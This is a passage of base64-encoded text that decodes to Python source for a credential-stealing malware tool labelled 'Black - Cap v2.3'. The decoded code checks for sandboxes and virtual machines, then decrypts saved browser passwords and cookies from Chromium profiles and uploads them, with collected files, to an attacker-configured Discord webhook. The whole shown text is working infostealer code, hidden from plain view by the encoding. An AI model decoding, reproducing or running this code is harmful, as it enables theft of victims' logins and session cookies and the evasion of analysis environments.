tQjVFMy0zREE3QzdCNTQ3RTMiLCAiQzdEMjMzNDItQTVENC02OEExLTU5QUMtQ0Y0MEY3MzVCMzYzIiwgIjYzMjAzMzQyLTBFQjAtQUExQS00REY1LTNGQjM3REJCMDY3MCIsCiAgICAgICAgICAgICI0NEI5NEQ1Ni02NUFCLURDMDItODZBMC05ODE0M0E3NDIzQkYiLCAiNjYwODAwM0YtRUNFNC00OTRFLUIwN0UtMUM0NjE1RDFEOTNDIiwgIkQ5MTQyMDQyLThGNTEtNUVGRi1ENUY4LUVFOUFFM0QxNjAyQSIsCiAgICAgICAgICAgICI0OTQzNEQ1My0wMjAwLTkwMzYtMjUwMC0zNjkwMjUwMDNBRjAiLCAiOEI0RTgyNzgtNTI1Qy03MzQzLUI4MjUtMjgwQUVCQ0QzQkNCIiwgIjRENEREQzk0LUUwNkMtNDRGNC05NUZFLTMzQTFBREE1QUMyNyIsCiAgICAgICAgICAgICJCQjY0RTA0NC04N0JBLUM4NDctQkMwQS1DNzk3RDFBMTZBNTAiLCAiMkU2RkI1OTQtOUQ1NS00NDI0LThFNzQtQ0UyNUEyNUUzNkIwIiwgIjQyQTgyMDQyLTNGMTMtNTEyRi01RTNELTZCRjRGRkZEODUxOCIKICAgICAgICBdCiAgICAgICAgc2VsZi5ibGlwcyA9IFsKICAgICAgICAgICAgJzg4LjEzMi4yMzEuNzEnLCAnNzguMTM5LjguNTAnLCAnMjAuOTkuMTYwLjE3MycsICc4OC4xNTMuMTk5LjE2OScsICc4NC4xNDcuNjIuMTInLCAKICAgICAgICAgICAgJzE5NC4xNTQuNzguMTYwJywgJzkyLjIxMS4xMDkuMTYwJywgJzE5NS43NC43Ni4yMjInLCAnMTg4LjEwNS45MS4xMTYnLCAnMzQuMTA1LjE4My42OCcsIAogICAgICAgICAgICAnOTIuMjExLjU1LjE5OScsICc3OS4xMDQuMjA5LjMzJywgJzk1LjI1LjIwNC45MCcsICczNC4xNDUuODkuMTc0JywgJzEwOS43NC4xNTQuOTAnLCAKICAgICAgICAgICAgJzEwOS4xNDUuMTczLjE2OScsICczNC4xNDEuMTQ2LjExNCcsICcyMTIuMTE5LjIyNy4xNTEnLCAnMTk1LjIzOS41MS41OScsICcxOTIuNDAuNTcuMjM0JywgCiAgICAgICAgICAgICc2NC4xMjQuMTIuMTYyJywgJzM0LjE0Mi43NC4yMjAnLCAnMTg4LjEwNS45MS4xNzMnLCAnMTA5Ljc0LjE1NC45MScsICczNC4xMDUuNzIuMjQxJywKICAgICAgICAgICAgICcxMDkuNzQuMTU0LjkyJywgJzIxMy4zMy4xNDIuNTAnLCAnMTA5Ljc0LjE1NC45MScsICc5My4yMTYuNzUuMjA5JywgJzE5Mi44Ny4yOC4xMDMnLCAKICAgICAgICAgICAgICc4OC4xMzIuMjI2LjIwMycsICcxOTUuMTgxLjE3NS4xMDUnLCAnODguMTMyLjIyNS4xMDAnLCAnOTIuMjExLjE5Mi4xNDQnLCAnMzQuODMuNDYuMTMwJywgCiAgICAgICAgICAgICAnMTg4LjEwNS45MS4xNDMnLCAnMzQuODUuMjQzLjI0MScsICczNC4xNDEuMjQ1LjI1JywgJzE3OC4yMzkuMTY1LjcwJywgJzg0LjE0Ny41NC4xMTMnLCAKICAgICAgICAgICAgICcxOTMuMTI4LjExNC40NScsICc5NS4yNS44MS4yNCcsICc5Mi4yMTEuNTIuNjInLCAnODguMTMyLjIyNy4yMzgnLCAnMzUuMTk5LjYuMTMnLCAKICAgICAgICAgICAgICc4MC4yMTEuMC45NycsICczNC44NS4yNTMuMTcwJywgJzIzLjEyOC4yNDguNDYnLCAnMzUuMjI5LjY5LjIyNycsICczNC4xMzguOTYuMjMnLCAKICAgICAgICAgICAgICcxOTIuMjExLjExMC43NCcsICczNS4yMzcuNDcuMTInLCAnODcuMTY2LjUwLjIxMycsICczNC4yNTMuMjQ4LjIyOCcsICcyMTIuMTE5LjIyNy4xNjcnLCAKICAgICAgICAgICAgICcxOTMuMjI1LjE5My4yMDEnLCAnMzQuMTQ1LjE5NS41OCcsICczNC4xMDUuMC4yNycsICcxOTUuMjM5LjUxLjMnLCAnMzUuMTkyLjkzLjEwNycKICAgICAgICAgICAgIF0KCiAgICAgICAgZm9yIGZ1bmMgaW4gW3NlbGYubHN0Y2hlYywgc2VsZi5yZWdrZXksIHNlbGYuc3AzY0NoZXFdOgogICAgICAgICAgICBwcm9jZXNzID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZnVuYywgZGFlbW9uPVRydWUpCiAgICAgICAgICAgIHNlbGYucHJvY2Vzc2VzLmFwcGVuZChwcm9jZXNzKQogICAgICAgICAgICBwcm9jZXNzLnN0YXJ0KCkKICAgICAgICBmb3IgdCBpbiBzZWxmLnByb2Nlc3NlczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdC5qb2luKCkKICAgICAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgZGVmIHByb2dyYW1FeGl0KHNlbGYpOgogICAgICAgIHNlbGYuX19jbGFzc19fLmluVk0gPSBUcnVlCgogICAgZGVmIGxzdGNoZWMoc2VsZik6CiAgICAgICAgZm9yIHBhdGggaW4gW3InRDpcVG9vbHMnLCByJ0Q6XE9TMicsIHInRDpcTlQzWCddOgogICAgICAgICAgICBpZiBudHBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgICAgIGZvciB1c2VyIGluIHNlbGYuYmx1c2V1cnM6CiAgICAgICAgICAgIGlmIGluZm9jb20gPT0gdXNlcjoKICAgICAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQoKICAgICAgICBmb3IgcGNOYW1lIGluIHNlbGYuYmxwY25hbWU6CiAgICAgICAgICAgIGlmIHZjdG1fcGMgPT0gcGNOYW1lOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgICAgIGZvciBwY0lQIGluIHNlbGYuYmxpcHM6CiAgICAgICAgICAgIGlmIHNlbGYubmV0XzFmbygpWzBdID09IHBjSVA6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICAgICAgZm9yIHV1aWR3bmR6IGluIHNlbGYuYmxod2lkOgogICAgICAgICAgICBpZiBzZWxmLnN5c18xZm8oKVswXSA9PSB1dWlkd25kejoKICAgICAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQoKICAgIGRlZiBzcDNjQ2hlcShzZWxmKToKICAgICAgICBpZiBpbnQocjRtKSA8PSAzOiAKICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCiAgICAgICAgaWYgaW50KGQxc2spIDw9IDEyMDogIAogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBpZiBpbnQocHN1dGlsLmNwdV9jb3VudCgpKSA8PSAxOgogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICBkZWYgcmVna2V5KHNlbGYpOgogICAgICAgIHJlZzEgPSBvcy5zeXN0ZW0oIlJFRyBRVUVSWSBIS0VZX0xPQ0FMX01BQ0hJTkVcXFNZU1RFTVxcQ29udHJvbFNldDAwMVxcQ29udHJvbFxcQ2xhc3NcXHs0RDM2RTk2OC1FMzI1LTExQ0UtQkZDMS0wODAwMkJFMTAzMTh9XFwwMDAwXFxEcml2ZXJEZXNjIDI+IG51bCIpCiAgICAgICAgcmVnMiA9IG9zLnN5c3RlbSgiUkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxcU1lTVEVNXFxDb250cm9sU2V0MDAxXFxDb250cm9sXFxDbGFzc1xcezREMzZFOTY4LUUzMjUtMTFDRS1CRkMxLTA4MDAyQkUxMDMxOH1cXDAwMDBcXFByb3ZpZGVyTmFtZSAyPiBudWwiKQogICAgICAgIGlmIChyZWcxIGFuZCByZWcyKSAhPSAxOgogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICAgICAgaGFuZGxlID0gd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfTE9DQUxfTUFDSElORSwgJ1NZU1RFTVxcQ3VycmVudENvbnRyb2xTZXRcXFNlcnZpY2VzXFxEaXNrXFxFbnVtJykKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlZ192YWwgPSB3aW5yZWcuUXVlcnlWYWx1ZUV4KGhhbmRsZSwgJzAnKVswXQogICAgICAgICAgICBpZiAoIlZNd2FyZSIgb3IgIlZCT1giKSBpbiByZWdfdmFsOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgd2lucmVnLkNsb3NlS2V5KGhhbmRsZSkKCgoKCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIiBhbmQgb3MubmFtZSA9PSAibnQiOgogICAgYXN5bmNpby5ydW4oYmNfaW5pdGlhbF9mdW5jKCkuaW5pdCgpKQogICAgCgoKCgpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCnRlbXAgPSBvcy5nZXRlbnYoIlRFTVAiKQpUaHJlYWRsaXN0ID0gW10KCmRlZiBmZXRjaF9jb25mKGU6IHN0cikgLT4gc3RyIG9yIGJvb2wgfCBOb25lOgogICAgICAgIHJldHVybiBfX2NvbmZpZ19fLmdldChlKQoKaG9vayA9IGZldGNoX2NvbmYoInlvdXJ3ZWJob29rdXJsIikKCmNsYXNzIERBVEFfQkxPQihTdHJ1Y3R1cmUpOgogICAgX2ZpZWxkc18gPSBbCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksCiAgICAgICAgKCdwYkRhdGEnLCBQT0lOVEVSKGNfY2hhcikpCiAgICBdCgpkZWYgR2V0RGF0YShibG9iX291dCk6CiAgICBjYkRhdGEgPSBpbnQoYmxvYl9vdXQuY2JEYXRhKQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhCiAgICBidWZmZXIgPSBjX2J1ZmZlcihjYkRhdGEpCiAgICBjZGxsLm1zdmNydC5tZW1jcHkoYnVmZmVyLCBwYkRhdGEsIGNiRGF0YSkKICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQogICAgcmV0dXJuIGJ1ZmZlci5yYXcKCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6CiAgICBidWZmZXJfaW4gPSBjX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsIGxlbihlbmNyeXB0ZWRfYnl0ZXMpKQogICAgYnVmZmVyX2VudHJvcHkgPSBjX2J1ZmZlcihlbnRyb3B5LCBsZW4oZW50cm9weSkpCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pCiAgICBibG9iX2VudHJvcHkgPSBEQVRBX0JMT0IobGVuKGVudHJvcHkpLCBidWZmZXJfZW50cm9weSkKICAgIGJsb2Jfb3V0ID0gREFUQV9CTE9CKCkKCiAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KSk6CiAgICAgICAgcmV0dXJuIEdldERhdGEoYmxvYl9vdXQpCgpkZWYgRGVjcnlwdFZhbHVlKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6CiAgICBzdGFydHMgPSBidWZmLmRlY29kZShlbmNvZGluZz0ndXRmOCcsIGVycm9ycz0naWdub3JlJylbOjNdCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOgogICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCmRlZiBMb2FkUmVxdWVzdHMobWV0aG9kZSwgdXJsLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIG1ldGhvZGUgPT0gJ1BPU1QnOgogICAgICAgICAgICAgICAgaWYgZGF0YSAhPSAnJzoKICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBvciByLnN0YXR1c19jb2RlID09IDQxMzogIyA0MTMgPSBEQVRBIFRPIEJJRwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKZGVmIExvYWRVcmxpYihob29rLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIGhlYWRlcnMgIT0gJyc6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSkpCiAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKCmRlZiBUcnVzdChDb29raWVzKToKICAgIGdsb2JhbCBERVRFQ1RFRAogICAgZGF0YSA9IHN0cihDb29raWVzKQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgaWYgbGVuKHRpbSkgPCAtMToKICAgICAgICBERVRFQ1RFRCA9IFRydWUKICAgICAgICByZXR1cm4gREVURUNURUQKICAgIGVsc2U6CiAgICAgICAgREVURUNURUQgPSBGYWxzZQogICAgICAgIHJldHVybiBERVRFQ1RFRAoKCgoKZGVmIFJlZm9ybWF0KGxpc3R0KToKICAgIGUgPSByZS5maW5kYWxsKCIoXHcrW2Etel0pIixsaXN0dCkKICAgIHdoaWxlICJodHRwcyIgaW4gZTogZS5yZW1vdmUoImh0dHBzIikKICAgIHdoaWxlICJjb20iIGluIGU6IGUucmVtb3ZlKCJjb20iKQogICAgd2hpbGUgIm5ldCIgaW4gZTogZS5yZW1vdmUoIm5ldCIpCiAgICByZXR1cm4gbGlzdChzZXQoZSkpCgpkZWYgdXBsb2FkKG5hbWUsIHRrPScnKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KCiAgICBpZiBuYW1lID09ICJiY19jaGVja2luZyI6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6ICcnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIkludGVyZXN0aW5nIGZpbGVzIGZvdW5kIG9uIHVzZXIgUEM6IiwKICAgICAgICAgICAgICAgICJ2YWx1ZSI6IHRrCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAnbmFtZSc6IGYnQmxhY2sgLSBDYXAgdjIuMycsCiAgICAgICAgICAgICAgICAndXJsJzogJ2h0dHBzOi8vZ2l0aHViLmNvbS9LU0NIZHNjJywKICAgICAgICAgICAgICAgICdpY29uX3VybCc6ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9EZXN0cnVDb3JkLUluamVjdC9tYWluL2JsYWNrY2FwLmdpZicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogImdpdGh1Yi5jb20vS1NDSGRzYyIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ2NvbG9yJzogMzc0Mjc2LAogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9CbGFja0NhcC1Bc3NldHMvbWFpbi9ibGFja2NhcCUyMCgyKS5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgfQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgogICAgcGF0aCA9IG5hbWUKICAgIGZpbGVzID0geydmaWxlJzogb3BlbihwYXRoLCAncmInKX0KCiAgICBpZiAiYmNfYWxscGFzc3dvcmRzIiBpbiBuYW1lOgoKICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHBhc3dXb3JkcykKCiAgICAgICAgaWYgbGVuKHJhKSA+IDEwMDA6CiAgICAgICAgICAgIHJyciA9IFJlZm9ybWF0KHN0cihwYXN3V29yZHMpKQogICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycikKCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6ICcnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIlBhc3N3b3JkcyBGb3VuZDoiLAogICAgICAgICAgICAgICAgInZhbHVlIjogcmEKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICduYW1lJzogZidCbGFjayAtIENhcCB2Mi4zJywKICAgICAgICAgICAgICAgICd1cmwnOiAnaHR0cHM6Ly9naXRodWIuY29tL0tTQ0hkc2MnLAogICAgICAgICAgICAgICAgJ2ljb25fdXJsJzogJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9LU0NIZHNjL0Rlc3RydUNvcmQtSW5qZWN0L21haW4vYmxhY2tjYXAuZ2lmJwogICAgICAgICAgICB9LAogICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgInRleHQiOiAiZ2l0aHViLmNvbS9LU0NIZHNjIiwKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ2NvbG9yJzogMzc0Mjc2LAogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvQmxhY2tDYXAtQXNzZXRzL21haW4vYmxhY2tjYXAlMjAoMikucG5nIiwKICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQoKICAgIGlmICJiY19hbGxjb29raWVzIiBpbiBuYW1lOgogICAgICAgIHJiID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gY29va2lXb3JkcykKICAgICAgICBpZiBsZW4ocmIpID4gMTAwMDoKICAgICAgICAgICAgcnJycnIgPSBSZWZvcm1hdChzdHIoY29va2lXb3JkcykpCiAgICAgICAgICAgIHJiID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcnJycnIpCgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiAnJywKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAibmFtZSI6ICJDb29raWVzIEZvdW5kOiIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiByYgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgJ25hbWUnOiBmJ0JsYWNrIC0gQ2FwIHYyLjMnLAogICAgICAgICAgICAgICAgJ3VybCc6ICdodHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYycsCiAgICAgICAgICAgICAgICAnaWNvbl91cmwnOiAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvRGVzdHJ1Q29yZC1JbmplY3QvbWFpbi9ibGFja2NhcC5naWYnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICJnaXRodWIuY29tL0tTQ0hkc2MiLAogICAgICAgICAgICB9LAogICAgICAgICAgICAnY29sb3InOiAzNzQyNzYsCiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9CbGFja0NhcC1Bc3NldHMvbWFpbi9ibGFja2NhcCUyMCgyKS5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgfQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgTG9hZFJlcXVlc3RzKCJQT1NUIiwgaG9vaywgZmlsZXM9ZmlsZXMpCgpkZWYgd3JpdGVmb3JmaWxlKGRhdGEsIG5hbWUpOgogICAgcGF0aCA9IG9zLmdldGVudigiVEVNUCIpICsgZiJce25hbWV9LnR4dCIKICAgIHdpdGggb3BlbihwYXRoLCBtb2RlPSd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICBmLndyaXRlKGYiQ3JlYXRlZCBieSBLU0NIIHwgaHR0cHM6Ly9naXRodWIuY29tL0tTQ0hkc2NcblxuIikKICAgICAgICBmb3IgbGluZSBpbiBkYXRhOgogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOgogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikKCgoKUGFzc3cgPSBbXQpkZWYgZ2V0UGFzc3cocGF0aCwgYXJnKToKICAgIGdsb2JhbCBQYXNzdwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0xvZ2luIERhdGEiCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybgoKICAgIHRlbXBmb2xkID0gdGVtcCArICJibGFja2NhcGVkIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IGNvbm5lY3QodGVtcGZvbGQpCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2luczsiKQogICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcGZvbGQpCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBsb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOgogICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gcGFzd1dvcmRzOiBwYXN3V29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgUGFzc3cuYXBwZW5kKGYiVVJMOiB7cm93WzBdfSBcbiBJRDoge3Jvd1sxXX0gXG4gUEFTU1cwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX1cblxuIikKICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ2JjX2FsbHBhc3N3b3JkcycpCgpDb29raWVzID0gW10KZGVmIGdldENvb2tpZShwYXRoLCBhcmcpOgogICAgZ2xvYmFsIENvb2tpZXMKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAiYmxhY2tjYXBlZCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgoKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gY29ubmVjdCh0ZW1wZm9sZCkKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBGUk9NIGNvb2tpZXMiKQogICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcGZvbGQpCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgoKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0gbG9hZHMoZi5yZWFkKCkpCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQoKICAgIGZvciByb3cgaW4gZGF0YToKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIGNvb2tpV29yZHM6IGNvb2tpV29yZHMuYXBwZ